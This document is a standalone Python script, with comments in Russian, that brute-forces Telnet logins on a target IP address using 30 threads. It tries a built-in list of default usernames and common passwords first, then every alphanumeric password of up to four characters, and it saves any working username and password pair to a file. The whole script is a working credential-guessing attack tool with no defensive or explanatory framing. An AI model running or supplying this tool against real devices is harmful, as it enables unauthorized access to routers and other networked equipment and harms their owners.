import socket
import threading
import itertools
import string
import os

host = "192.168.1.1"  # Замените на IP цели
port = 23

max_threads = 30
found = False
lock = threading.Lock()

default_logins = ["admin", "root", "user", "guest", "test"]
default_passwords = ["admin", "password", "123456", "12345678", "1234", "12345", "123456789", "root", "guest", "test", "123123", "abc123", "qwerty", "letmein", "monkey", "dragon", "111111", "passw0rd", "password1", "123qwe", "654321", "superuser"]

charset = string.ascii_letters + string.digits
min_len = 1
max_len = 4

def recv_until(sock, expected_list, timeout=5):
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(1024)
            if not chunk:
                break
            data += chunk
            for exp in expected_list:
                if exp in data:
                    return exp, data
    except socket.timeout:
        pass
    return None, data

def try_login(username, password):
    global found
    if found:
        return
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))

        prompt, _ = recv_until(sock, [b"login:", b"Login:"], timeout=3)
        if not prompt:
            sock.close()
            return

        sock.sendall(username.encode() + b"\n")

        prompt, _ = recv_until(sock, [b"Password:", b"password:"], timeout=3)
        if not prompt:
            sock.close()
            return

        sock.sendall(password.encode() + b"\n")

        prompt, response = recv_until(sock, [b"incorrect", b"failed", b"Login incorrect"], timeout=3)

        if not prompt:
            with lock:
                if not found:
                    found = True
                    print(f"\n[!!!] УСПЕХ: {username}:{password}")
                    with open("found.txt", "a") as f:
                        f.write(f"{username}:{password}\n")
        sock.close()
    except Exception as e:
        print(f"Ошибка: {e}")

def worker_queue(q):
    while not q.empty() and not found:
        username, password = q.get()
        print(f"Пробуем: {username}:{password}")
        try_login(username, password)
        q.task_done()

def load_list_from_file(filename, default_list):
    if os.path.isfile(filename):
        with open(filename, "r") as f:
            lines = [line.strip() for line in f if line.strip()]
            if lines:
                return lines
    return default_list

def generate_passwords(charset, min_len, max_len):
    for length in range(min_len, max_len + 1):
        for pwd_tuple in itertools.product(charset, repeat=length):
            yield ''.join(pwd_tuple)

if __name__ == "__main__":
    from queue import Queue

    logins = load_list_from_file("logins.txt", default_logins)
    passwords = load_list_from_file("passwords.txt", default_passwords)

    q = Queue()

    # Сначала словарные пары (логин x пароль)
    for username in logins:
        for password in passwords:
            q.put((username, password))

    # Потом полный перебор паролей для каждого логина
    for username in logins:
        for password in generate_passwords(charset, min_len, max_len):
            q.put((username, password))

    threads = []

    for _ in range(max_threads):
        t = threading.Thread(target=worker_queue, args=(q,))
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

    if not found:
        print("\n[!!!] Пароль не найден в заданных пределах.")
    else:
        print("\n[!!!] Готово, данные записаны в found.txt")
